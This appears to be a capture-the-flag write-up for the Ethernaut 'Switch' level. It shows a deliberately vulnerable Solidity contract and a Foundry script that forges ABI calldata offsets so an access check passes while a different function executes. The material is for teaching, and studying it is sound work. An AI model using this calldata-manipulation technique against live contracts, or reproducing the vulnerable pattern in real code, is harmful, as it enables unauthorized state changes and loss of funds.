# Level 29 - Switch ⏺⏺⏺⏺

{% embed url="https://ethernaut.openzeppelin.com/level/29" %}

### Level Setup

{% hint style="info" %}
Just have to flip the switch. Can't be that hard, right?

**Things that might help:**

Understanding how `CALLDATA` is encoded.
{% endhint %}

### Level Contract

{% embed url="https://github.com/OpenZeppelin/ethernaut/blob/a89c8f7832258655c09fde16e6602c78e5e99dbd/contracts/src/levels/Switch.sol" %}

{% code lineNumbers="true" fullWidth="true" %}
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Switch {
    bool public switchOn; // switch is off
    bytes4 public offSelector = bytes4(keccak256("turnSwitchOff()"));

    modifier onlyThis() {
        require(msg.sender == address(this), "Only the contract can call this");
        _;
    }

    modifier onlyOff() {
        // we use a complex data type to put in memory
        bytes32[1] memory selector;
        // check that the calldata at position 68 (location of _data)
        assembly {
            calldatacopy(selector, 68, 4) // grab function selector from calldata
        }
        require(selector[0] == offSelector, "Can only call the turnOffSwitch function");
        _;
    }

    function flipSwitch(bytes memory _data) public onlyOff {
        (bool success,) = address(this).call(_data);
        require(success, "call failed :(");
    }

    function turnSwitchOn() public onlyThis {
        switchOn = true;
    }

    function turnSwitchOff() public onlyThis {
        switchOn = false;
    }
}
```
{% endcode %}

### Exploit

{% tabs %}
{% tab title="Anvil" %}
```bash
make anvil-exploit-level-29

<INPUT_LEVEL_INSTANCE_CONTRACT_ADDRESS>
```
{% endtab %}

{% tab title="Holesky" %}
```bash
make holesky-exploit-level-29

<INPUT_LEVEL_INSTANCE_CONTRACT_ADDRESS>
```
{% endtab %}
{% endtabs %}

{% tabs %}
{% tab title="Exploit Deployment Script" %}
{% embed url="https://github.com/EridianAlpha/ethernaut-foundry/blob/5b6f223f2f9512f3e0f6bac0306dbc2032111051/script/Level29.s.sol" %}

{% code title="script/Level29.s.sol" %}
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {HelperFunctions} from "script/HelperFunctions.s.sol";

// ================================================================
// │                        LEVEL 29 - SWITCH                     │
// ================================================================

interface ISwitch {
    function flipSwitch(bytes memory _data) external;
    function offSelector() external returns (bytes4);
}

contract Exploit is Script, HelperFunctions {
    function run() public {
        address targetContractAddress = getInstanceAddress();
        ISwitch switchContract = ISwitch(targetContractAddress);

        vm.startBroadcast();
        bytes4 flipSwitchSelector = bytes4(keccak256("flipSwitch(bytes)"));
        bytes4 offSelector = switchContract.offSelector();
        bytes4 onSelector = bytes4(keccak256("turnSwitchOn()"));

        bytes memory callData = abi.encodePacked(
            flipSwitchSelector, // 4 bytes - 30c13ade (flipSwitch selector)
            uint256(0x60), // 32 bytes - offset for the data field
            new bytes(32), // 32 bytes - zero padding
            offSelector, // 4 bytes - 20606e15 (turnSwitchOff selector)
            new bytes(28), // 28 bytes - zero padding
            uint256(0x4), // 4 bytes - length of data field
            onSelector // 4 bytes - 76227e12 (turnSwitchOn selector)
        );

        // Call flipSwitch with this manipulated data
        (bool success,) = targetContractAddress.call(callData);
        require(success, "Call failed");

        vm.stopBroadcast();
    }
}
```
{% endcode %}
{% endtab %}
{% endtabs %}

Submit instance... 🥳

### Completion Message

{% hint style="info" %}
Assuming positions in `CALLDATA` with dynamic types can be erroneous, especially when using hard-coded `CALLDATA` positions.
{% endhint %}

### Notes

{% embed url="https://github.com/highskore/ethernaut-foundry/blob/main/test/Switch.t.sol" %}
